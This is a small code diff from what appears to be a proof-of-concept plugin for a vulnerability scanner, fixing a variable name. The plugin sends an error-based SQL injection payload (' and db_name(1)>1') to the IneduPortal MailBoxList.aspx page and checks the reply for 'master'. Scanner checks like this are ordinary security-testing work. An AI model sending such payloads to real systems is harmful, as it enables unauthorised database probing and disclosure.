@@ -53,7 +53,7 @@ class Poc(ABPoc):
             hh = hackhttp.hackhttp()
             payload1 = '/IneduPortal/Components/MailBox/MailBoxList.aspx?id=1'
             get = '%20and%20db_name(1)%3E1'
-            verify_url = self.target + payload + get
+            verify_url = self.target + payload1 + get
             code, head, res, errcode, _ = hh.http(verify_url)
             m = re.search('master', res)
 
